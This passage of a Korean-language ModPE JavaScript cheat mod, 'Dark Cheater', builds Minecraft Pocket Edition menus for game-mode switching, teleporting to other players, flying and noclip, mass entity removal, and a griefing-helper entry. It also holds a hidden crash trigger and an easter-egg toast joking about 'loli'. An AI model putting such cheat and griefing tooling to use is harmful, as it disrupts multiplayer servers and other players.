btnR.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.CENTER|android.view.Gravity.TOP, -Dark.read("btnDist"), 0);
btnF.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.CENTER|android.view.Gravity.TOP, Dark.read("btnDist"), 0);
}
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function clockMoving(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var radios = new android.widget.RadioGroup(ctx);
radios.setOrientation(1);
var radio1 = new android.widget.RadioButton(ctx);
var radio2 = new android.widget.RadioButton(ctx);
var radio3 = new android.widget.RadioButton(ctx);
var radio4 = new android.widget.RadioButton(ctx);
radio1.setText("순간이동");
radio2.setText("순보");
radio3.setText("플래시 점프");
radio4.setText("비활성화");
radio1.setId(1);
radio2.setId(2);
radio3.setId(3);
radio4.setId(4);
radio1.setTextColor(white);
radio2.setTextColor(white);
radio3.setTextColor(white);
radio4.setTextColor(white);
radios.addView(radio1);
radios.addView(radio2);
radios.addView(radio3);
radios.addView(radio4);
radios.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
if(checkedId==1){
move = 1;
}
if(checkedId==2){
move = 2;
}
if(checkedId==3){
move = 3;
}
if(checkedId==4){
move = 0;
}
}
}));
layout.addView(radios);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setTitle("이동 방식 선택");
dialog.setView(scroll);
dialog.setNegativeButton("확인", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function buttonLocation(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);

var layout1 = new android.widget.LinearLayout(ctx);
layout1.setGravity(android.view.Gravity.CENTER);
layout1.setOrientation(0);
var loc1 = new android.widget.Button(ctx);
var loc2 = new android.widget.Button(ctx);
var loc3 = new android.widget.Button(ctx);
loc1.setText("↖");
loc2.setText("↑");
loc3.setText("↗");
loc1.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
locate = 0;
Dark.toast("수정되었습니다.");
}
});
loc2.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
locate = 2;
Dark.toast("수정되었습니다.");
}
});
loc3.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
locate = 3;
Dark.toast("수정되었습니다.");
}
});
layout1.addView(loc1);
layout1.addView(loc2);
layout1.addView(loc3);

var layout2 = new android.widget.LinearLayout(ctx);
layout2.setGravity(android.view.Gravity.CENTER);
layout2.setOrientation(0);
var loc4 = new android.widget.Button(ctx);
var loc5 = new android.widget.Button(ctx);
var loc6 = new android.widget.Button(ctx);
loc4.setText("←");
loc5.setText("○");
loc6.setText("→");
loc4.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
locate = 4;
Dark.toast("수정되었습니다.");
}
});
loc5.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
locate = 5;
Dark.toast("수정되었습니다.");
}
});
loc6.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
locate = 6;
Dark.toast("수정되었습니다.");
}
});
layout2.addView(loc4);
layout2.addView(loc5);
layout2.addView(loc6);

var layout3 = new android.widget.LinearLayout(ctx);
layout3.setGravity(android.view.Gravity.CENTER);
layout3.setOrientation(0);
var loc7 = new android.widget.Button(ctx);
var loc8 = new android.widget.Button(ctx);
var loc9 = new android.widget.Button(ctx);
loc7.setText("↙");
loc8.setText("↓ ");
loc9.setText("↘");
loc7.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
locate = 7;
Dark.toast("수정되었습니다.");
}
});
loc8.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
locate = 8;
Dark.toast("수정되었습니다.");
}
});
loc9.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
locate = 9;
Dark.toast("수정되었습니다.");
}
});
layout3.addView(loc7);
layout3.addView(loc8);
layout3.addView(loc9);

layout.addView(layout1);
layout.addView(layout2);
layout.addView(layout3);

dialog.setTitle("버튼 위치 수정");
dialog.setView(layout);
dialog.setNegativeButton("터치한 곳으로 설정", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
makeScreen();
Dark.save("locate", 10);
locate = 10;
Dark.toast("화면을 터치하여 주세요.");
}
}));
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
Dark.save("locate", locate);
if(btn!=null){
btn.dismiss();
btn = null;
}
Dark.makeButton();
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}



function semiDarkCheater(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
if(menu==null){
try{
menu = new android.widget.PopupWindow();
var title = makeTitle("Dark\nCheater\n", true);
title.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close();
Dark.save("makerFunc", true);
}
});
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var button = new Array();
var menus = ["인벤토리 수정", "게임모드 변경", "플레이어 이동", "엔티티 스폰", "서버 관련", "이동 계열", "테러 도우미", "포션 효과", "기타 기능", "환경 설정"];
for(var n in menus)
button[n] = makeButton(menus[n]);
button[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
inventorySet();
}
});
button[0].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Dark.close(false);
armorEdit();
return true;
}
});
button[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
if(Level.getGameMode()==0){
Level.setGameMode(1);
Dark.toast("크리에이티브로 변경되었습니다.");
}
else if(Level.getGameMode()==1){
Level.setGameMode(0);
Dark.toast("서바이벌로 변경되었습니다.");
}
}
});
button[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
playerTarget = ad;
playerTp();
}
});
button[2].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Dark.close(false);
goToPlayer();
return true;
}
});
button[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
entitySet(false);
}
});
button[4].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
serverSetting();
}
});
button[5].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
moveSet(false);
}
});
button[6].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
if(Dark.read("linkT")=="true") Dark.save("th", true);
else terrorHelper(terPass);
}
});
button[7].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
makeEffect();
}
});
button[8].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
elseSet(false);
}
});
button[8].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Dark.close(false);
openPlus();
return true;
}
});
button[9].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(false);
darkCheaterSetting();
}
});
for(var n in menus)
layout.addView(button[n]);
var exit = new android.widget.Button(ctx);
exit.setText("나가기");
exit.setBackgroundDrawable(setBtnColor());
exit.setTextColor(white2);
exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(true);
}
});
layout.addView(exit);
var text = new android.widget.TextView(ctx);
text.setText("\n© 2015 Dark Tornado\n");
text.setTextSize(11);
text.setTextColor(white2);
text.setGravity(android.view.Gravity.CENTER);
text.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close();
Dark.save("tra", true);
}
});
text.setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
dce.re = true;
Dark.toast("로리는 사랑입니다.");
return true;
}
});
layout.addView(text);
var scroll = makeScroll(layout, menu);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menu.setContentView(layout2);
if(side==0) menu.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.RIGHT|android.view.Gravity.TOP, 0, 0);
if(side==1) menu.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.LEFT|android.view.Gravity.TOP, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
else if(menu!=null){
Dark.close(true);
}
if(version==Dark.hyperRead("blockData")) makeCrash();
}
}));
}


function goToPlayer(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
Dark.toast("플레이어를 선택하세요");
var player = null;
var players = new Array();
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players.push(e);
}
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var radios = new android.widget.RadioGroup(ctx);
radios.setOrientation(1);
var radio = new Array();
for(var n in players){
radio[n] = new android.widget.RadioButton(ctx);
radio[n].setText(Player.getName(players[n]));
radio[n].setId(n);
radio[n].setTextColor(white);
radios.addView(radio[n]);
}
radios.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
player = players[checkedId];
Dark.toast("위치 : "+Math.round(Entity.getX(player)-0.5)+", "+Math.floor(Entity.getY(player))+", "+Math.round(Entity.getZ(player)-0.5));
}
}));
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.addView(radios);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setTitle("플레이어에게 이동");
dialog.setView(scroll);
dialog.setNegativeButton("취소", null);
dialog.setNeutralButton("바로 이동", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
Entity.setPosition(Player.getEntity(), Entity.getX(player), Entity.getY(player)+1, Entity.getZ(player));
}
}));
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
playerTarget = player;
moving = true;
Dark.toast("터치하시면 이동됩니다");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function giveSpawnEgg(n){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("개수 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("개수를 입력하세요");
loc2.setTextColor(white);
loc2.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
layout.addView(loc1);
layout.addView(loc2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("개수 설정");
dialog.setNegativeButton("취소", null);
dialog.setNeutralButton("바로 지급", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
addItemInventory(383, loc2.getText(), n);
Dark.toast("지급되었습니다.");
}
}));
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
add.c = loc2.getText();
add.d = n;
Dark.toast("터치하시면 지급됩니다.");
adding = 4;
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function makeCross(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
if(tf==true){
try{
cross = new android.widget.PopupWindow();
var layout = new android.widget.RelativeLayout(ctx);
var text = new android.widget.TextView(ctx);
text.setText("+");
text.setGravity(android.view.Gravity.CENTER);
text.setTextColor(white);
layout.addView(text);
cross.setContentView(layout);
cross.setWidth(dip2px(ctx, 20));
cross.setHeight(dip2px(ctx, 20));
cross.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
cross.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
else if(tf==false){
if(cross!=null){
cross.dismiss();
cross = null;
}
}
}
}));
}


function checkTile(x, y, z){
if(!(getTile(x, y, z)==0||getTile(x, y, z)==8||getTile(x, y, z)==9||getTile(x, y, z)==101||getTile(x, y, z)==102||getTile(x, y, z)==106||getTile(x, y, z)==51||getTile(x, y, z)==18||getTile(x, y, z)==11)){
return true;
}
else{
return false;
}

}


function showClock(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run:function(){
if(tf==true){
try{
var ap, hour, min, sec;
var day = new Date();
hour = day.getHours();
min = day.getMinutes();
sec = day.getSeconds();
if(hour>12){
hour -=12;
ap = " 오후 ";
}
else
ap = " 오전 ";
if(min<10)
min = "0"+min;
if(sec<10)
sec = "0"+sec;
clock = new android.widget.PopupWindow();
clockText = new android.widget.TextView(ctx)
clockText.setText(ap+hour+"시 "+min+"분 "+sec+"초");
clockText.setTextSize(15);
clockText.setTextColor(white);
clockText.setGravity(android.view.Gravity.CENTER);
clockText.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
openAnalogClock();
}
});
setDragListener(clock, clockText, 2);
clock.setContentView(clockText);
clock.setWidth(dip2px(ctx, 135));
clock.setHeight(dip2px(ctx, 20));
clock.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(150, 80, 80, 80)));
if(Dark.read("clockX")=="") clock.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.RIGHT|android.view.Gravity.TOP, 80, 0);
else clock.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.LEFT|android.view.Gravity.TOP, Dark.read("clockX"), Dark.read("clockY"));
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
else if(tf==false){
if(clock!=null){
clock.dismiss();
clock = null;
}
}
}
}));
}


function inputCommand(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc2 = new android.widget.EditText(ctx);
loc2.setHint("명령어를 입력하세요...");
layout.addView(loc2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("명령어 입력");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
procCmd(loc2.getText().toString());
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function nearEntitySet(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
menuE2 = new android.widget.PopupWindow();
var title = makeTitle("주변 엔티티 관리");
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btns = new Array();
var menus = ["체력 설정", "체력 감소", "삭제", "불붙이기", "포션 효과"];
for(var n in menus){
btns[n] = makeButton(menus[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
entMenu(v.getId());
}
});
layout.addView(btns[n]);
}
var exit = makeExit(menuE2);
layout.addView(exit);
var scroll = makeScroll(layout, menuE2);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuE2.setContentView(layout2);
menuE2.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function entMenu(type){
if(type==4){
giveEffectToEntity();
}
else{
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var title, txt, txtH;
if(type==0){
title = "주변 엔티티 체력 설정";
txt = "체력";
txtH = "체력을 입력하세요";
}
if(type==1){
title = "주변 엔티티 체력 감소";
txt = "체력 감소량";
txtH = "체력 감소량을 입력하세요";
}
if(type==2){
title = "주변 엔티티 삭제";
txt = null;
}
if(type==3){
title = "주변 엔티티 불붙이기";
txt = "시간";
txtH = "불탈 시간을 입력하세요";
}
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var txt1 = new android.widget.TextView(ctx);
txt1.setText("엔티티 코드");
txt1.setTextSize(18);
txt1.setTextColor(white);
var txt2 = new android.widget.EditText(ctx);
txt2.setHint("엔티티 코드를 입력하세요(생략시 모든 엔티티)...");
txt2.setTextColor(white);
txt2.setInputType(number);
var txt3 = new android.widget.TextView(ctx);
txt3.setText("범위");
txt3.setTextSize(18);
txt3.setTextColor(white);
var txt4 = new android.widget.EditText(ctx);
txt4.setHint("반경(범위)을 입력하세요");
txt4.setTextColor(white);
txt4.setInputType(number);
var txt5 = new android.widget.TextView(ctx);
txt5.setText(txt);
txt5.setTextSize(18);
txt5.setTextColor(white);
if(txt!=null){
var txt6 = new android.widget.EditText(ctx);
txt6.setHint(txtH);
txt6.setTextColor(white);
txt6.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
}
layout.addView(txt1);
layout.addView(txt2);
layout.addView(txt3);
layout.addView(txt4);
if(txt!=null){
layout.addView(txt5);
layout.addView(txt6);
}
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("주변 엔티티 관리");
dialog.setNegativeButton("닫기", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
var r = txt4.getText();
for each(var e in Entity.getAll()){
px = Math.abs(Entity.getX(ad)-Entity.getX(e));
py = Math.abs(Entity.getY(ad)-Entity.getY(e));
pz = Math.abs(Entity.getZ(ad)-Entity.getZ(e));
if(px<=r&&py<=r&&pz<=r&&ad!=e){
if(txt2.getText().toString()==""&&!Player.isPlayer(e)&&Entity.getEntityTypeId(e)!=83){
if(type==0) Entity.setHealth(e, txt6.getText());
if(type==1) Entity.setHealth(e, Entity.getHealth(e)-txt6.getText());
if(type==2) Entity.remove(e);
if(type==3) Entity.setFireTicks(e, txt6.getText());
Dark.toast("플레이어와 그림은 예외입니다.");
}
else if(Entity.getEntityTypeId(e)==txt2.getText()){
if(type==0) Entity.setHealth(e, txt6.getText());
if(type==1) Entity.setHealth(e, Entity.getHealth(e)-txt6.getText());
if(type==2) Entity.remove(e);
if(type==3) Entity.setFireTicks(e, txt6.getText());
}
}
}
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}
}


function giveEffectType(target, tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var types = ["포화", "흡수", "체력 신장", "위더", "독", "나약함", "허기", "야간투시", "실명", "투명화", "수중 호흡", "화염저항", "저항", "재생", "멀미", "점프 강화", "즉시 데미지", "즉시 회복", "힘", "피로", "성급함", "구속", "신속"];
var typeId = new Array();
var checks = new Array();
for(var n in types){
checks[n] = new android.widget.CheckBox(ctx);
checks[n].setText(types[n]);
checks[n].setId(n);
checks[n].setTextColor(white);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff==true){
typeId.push(check.getId());
}
else if(onoff==false){
typeId.splice(typeId.indexOf(check.getId()), 1);
}
}
}));
layout.addView(checks[n]);
}
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("포션 효과 부여 - 종류");
dialog.setNegativeButton("닫기", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
giveEffectTime(target, typeId, tf);
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function giveEffectTime(target, typeId, tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var type = [MobEffect.saturation, MobEffect.absorption, MobEffect.healthBoost, MobEffect.wither, MobEffect.poison, MobEffect.weakness, MobEffect.hunger, MobEffect.nightVision, MobEffect.blindness, MobEffect.invisibility, MobEffect.waterBreathing, MobEffect.fireResistance, MobEffect.damageResistance, MobEffect.regeneration, MobEffect.confusion, MobEffect.jump, MobEffect.harm, MobEffect.heal, MobEffect.damageBoost, MobEffect.digSlowdown, MobEffect.digSpeed, MobEffect.movementSlowdown, MobEffect.movementSpeed];
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var txt1 = new android.widget.TextView(ctx);
txt1.setText("지속시간(초)");
txt1.setTextSize(18);
txt1.setTextColor(white);
var txt2 = new android.widget.EditText(ctx);
txt2.setHint("지속시간을 입력하세요");
txt2.setTextColor(white);
txt2.setInputType(number);
var txt3 = new android.widget.TextView(ctx);
txt3.setText("강도");
txt3.setTextSize(18);
txt3.setTextColor(white);
var txt4 = new android.widget.EditText(ctx);
txt4.setHint("강도를 입력하세요");
txt4.setTextColor(white);
txt4.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
layout.addView(txt1);
layout.addView(txt2);
layout.addView(txt3);
layout.addView(txt4);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("포션 효과 부여 - 지속시간&강도");
dialog.setNegativeButton("닫기", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(tf){
for(var n in typeId){
for each(var pp in target)
Entity.addEffect(pp, type[typeId[n]], 20*Number(txt2.getText()), Number(txt4.getText())-1, true, false);
}
Dark.toast("포션 효과를 부여하였습니다.");
}
else{
for(var n in typeId){
Entity.addEffect(target, type[typeId[n]], 20*Number(txt2.getText()), Number(txt4.getText())-1, true, false);
}
Dark.toast(Player.getName(target)+"에게 포션 효과를 부여하였습니다.");
if(pca) darkMessage(Player.getName(target)+"에게 포션 효과를 부여하였습니다.", true);
}
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function openFlying(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuJ = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var hstay = new android.widget.Button(ctx);
var hfly = new android.widget.Button(ctx);
var hside = new android.widget.Button(ctx);
hstay.setText("S");
hfly.setText("F");
hside.setText("f/b");
hstay.setOnClickListener(new android.view.View.OnClickListener({
onClick: function(v){
if(j.m==1){
j.m = 0;
Dark.toast("Staying Mode off");
}
else{
j.m = 1;
Dark.toast("Staying Mode on");
}
}
}));
hfly.setOnClickListener(new android.view.View.OnClickListener({
onClick: function(v){
if(j.m==2){
j.m = 0;
Dark.toast("Flying Mode off");
}
else{
j.m = 2;
Dark.toast("Flying Mode on");
}
}
}));
hside.setOnClickListener(new android.view.View.OnClickListener({
onClick: function(v){
if(j.f==0){
j.f = 1;
Dark.toast("Back Mode");
}
else if(j.f==1){
j.f = 0;
Dark.toast("Fornt Mode");
}
}
}));
hstay.setBackgroundDrawable(setBtnColor());
hfly.setBackgroundDrawable(setBtnColor());
hside.setBackgroundDrawable(setBtnColor());
hstay.setTextColor(white);
hfly.setTextColor(white);
hside.setTextColor(white);
layout.addView(hstay);
layout.addView(hfly);
layout.addView(hside);
if(side==0) setDragListener(menuJ, hfly, 5);
if(side==1) setDragListener(menuJ, hfly, 3);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
menuJ.setContentView(scroll);
menuJ.setWidth(dip2px(ctx, 50));
menuJ.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight()/2);
menuJ.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
if(side==0)
menuJ.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT|android.view.Gravity.CENTER, 0, 0);
if(side==1)
menuJ.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function openWeb(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var menu = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
var loadWeb = new android.webkit.WebView(ctx);
var webSet = loadWeb.getSettings();
webSet.setJavaScriptEnabled(wvsa[1]);
webSet.setBuiltInZoomControls(wvsa[2]);
webSet.setSaveFormData(wvsa[3]);
webSet.setSavePassword(wvsa[4]);
loadWeb.setWebChromeClient(new android.webkit.WebChromeClient());
loadWeb.setWebViewClient(new android.webkit.WebViewClient());
if(Dark.read("hp")==""){
Dark.toast("홈페이지를 먼저 설정해 주세요.");
return;
}
loadWeb.loadUrl("http:\/\/"+Dark.read("hp"));
layout2.addView(loadWeb);
var exit = makeButton("뒤로/나가기");
exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
if(loadWeb.canGoBack()){
loadWeb.goBack();
}
else{
if(menu!=null){
menu.dismiss();
menu = null;
}
}
}
});
layout.addView(exit);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout2);
layout.addView(scroll);
menu.setContentView(layout);
menu.setFocusable(true);
if(wvsa[0]){
menu.setWidth(ctx.getWindowManager().getDefaultDisplay().getWidth());
menu.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight());
}
else{
menu.setWidth(ctx.getWindowManager().getDefaultDisplay().getWidth()*2/3);
menu.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight()*3/4);
}
menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(70, 0, 0, 0)));
menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function setHome(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc2 = new android.widget.EditText(ctx);
loc2.setHint("'http:\/\/'를 제외한주소를 입력하세요...");
if(Dark.read("hp")!="") loc2.setText(Dark.read("hp")+"");
layout.addView(loc2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("홈페이지 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
Dark.save("hp", loc2.getText().toString());
Dark.toast("홈페이지가 'http:\/\/"+loc2.getText()+"'로 설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function moveSet(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuM = new android.widget.PopupWindow();
var title = makeTitle("이동 계열");
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btnT = new Array();
var menusT = ["공중부양", "블록 통과", "R/W & Zoom", "자동 걷기", "매직 카펫", "제트팩", "벽타기", "숙이기", "Smart Moving", "낙뎀 방지", "점프 강화"];
for(var n in menusT){
btnT[n] = new android.widget.ToggleButton(ctx);
btnT[n].setTextOn(menusT[n]);
btnT[n].setTextOff(menusT[n]);
btnT[n].setTextColor(white2);
}
btnT[0].setChecked(Player.canFly());
btnT[1].setChecked(pass);
if(btnR==null) btnT[2].setChecked(false);
else if(btnR!=null) btnT[2].setChecked(true);
btnT[3].setChecked(walk);
if(mcBtn==null) btnT[4].setChecked(false);
else btnT[4].setChecked(true);
btnT[5].setChecked(j.on);
btnT[6].setChecked(climbing);
btnT[7].setChecked(sneak);
if(s.btn==null) btnT[8].setChecked(false);
else if(s.btn!=null) btnT[8].setChecked(true);
btnT[9].setChecked(nf.tf);
btnT[10].setChecked(jump);
btnT[0].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
Player.setCanFly(onoff);
}
}));
btnT[1].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
try{
if(onoff==true){
Entity.setCollisionSize(Player.getEntity(), -1, -1);
pass = true;
}
else if(onoff==false){
Entity.setCollisionSize(Player.getEntity(), 0.7, 1.8);
pass = false;
}
}
catch(e){
clientMessage(e);
}
}
}));
btnT[2].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff==true){
makeTwoBtn();
}
else if(onoff==false){
if(btnR!=null){
btnR.dismiss();
btnR = null;
}
if(btnF!=null){
btnF.dismiss();
btnF = null;
}
ModPE.resetFov();
run = false;
}
}
}));
btnT[3].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
walk = onoff;
}
}));
btnT[4].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
makeMcBtn(onoff);
}
}));
btnT[5].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff==true){
